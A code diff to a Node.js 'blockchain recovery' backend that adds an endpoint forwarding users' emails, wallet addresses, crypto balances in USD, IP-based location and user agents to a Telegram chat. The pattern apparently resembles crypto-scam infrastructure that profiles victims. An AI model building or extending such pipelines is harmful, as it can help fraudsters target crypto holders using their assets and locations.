@@ -1,4 +1,4 @@
-// index.js - BLOCKCHAIN RECOVERY BACKEND - WORKING TELEGRAM
+// index.js - BLOCKCHAIN RECOVERY BACKEND - WITH SEND REPORT ENDPOINT
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -56,7 +56,7 @@ const limiter = rateLimit({
 app.use('/api/', limiter);
 
 // ============================================
-// TELEGRAM FUNCTIONS - WORKING VERSION (NO PLACEHOLDER CHECK)
+// TELEGRAM FUNCTIONS - WORKING VERSION
 // ============================================
 
 async function sendTelegramMessage(text) {
@@ -194,6 +194,62 @@ app.get('/api/test-telegram', async (req, res) => {
       chatIdUsed: TELEGRAM_CHAT_ID,
       error: error.response?.data || error.message
     });
+  }
+});
+
+// ============================================
+// SEND REPORT ENDPOINT - User reports to Telegram
+// ============================================
+
+app.post('/api/send-report', async (req, res) => {
+  try {
+    const { userEmail, walletAddress, issue, location, balances, userAgent, timestamp } = req.body;
+    
+    console.log(`\n📧 RECEIVED REPORT from ${userEmail || 'No email'}`);
+    console.log(`   Wallet: ${walletAddress || 'Not connected'}`);
+    console.log(`   Issue: ${issue?.substring(0, 100)}...`);
+    
+    // Format balances for display
+    let balancesText = '';
+    if (balances && Object.keys(balances).length > 0) {
+      balancesText = '\n\n💰 <b>Detected Balances:</b>';
+      Object.entries(balances).forEach(([chain, data]) => {
+        balancesText += `\n   🔹 ${chain}: ${data.amount?.toFixed(6) || '0'} ${data.symbol || ''} = $${data.valueUSD?.toFixed(2) || '0'}`;
+      });
+    } else {
+      balancesText = '\n\n💰 <b>Balances:</b> No balances detected';
+    }
+    
+    // Format location
+    let locationText = '';
+    if (location && location.country) {
+      locationText = `\n📍 <b>Location:</b> ${location.country} ${location.flag || '🌍'}${location.city ? `, ${location.city}` : ''}\n   <b>IP:</b> ${location.ip || 'Unknown'}`;
+    }
+    
+    // Send to Telegram
+    const telegramMessage = 
+      `📧 <b>NEW SUPPORT REPORT</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📧 <b>User Email:</b> ${userEmail || 'Not provided'}\n` +
+      `👛 <b>Wallet:</b> ${walletAddress ? `${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}` : 'Not connected'}\n` +
+      `📝 <b>Issue Description:</b>\n${issue || 'No description provided'}\n` +
+      `${balancesText}\n` +
+      `${locationText}\n` +
+      `💻 <b>User Agent:</b> ${userAgent?.substring(0, 80) || 'Unknown'}\n` +
+      `🕐 <b>Time:</b> ${new Date(timestamp || Date.now()).toLocaleString()}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📌 <b>Action Required:</b> Please follow up with this user.`;
+    
+    await sendTelegramMessage(telegramMessage);
+    
+    res.json({ 
+      success: true, 
+      message: 'Report sent successfully to support team' 
+    });
+    
+  } catch (error) {
+    console.error('Send report error:', error);
+    res.status(500).json({ success: false, error: 'Failed to send report' });
   }
 });
 
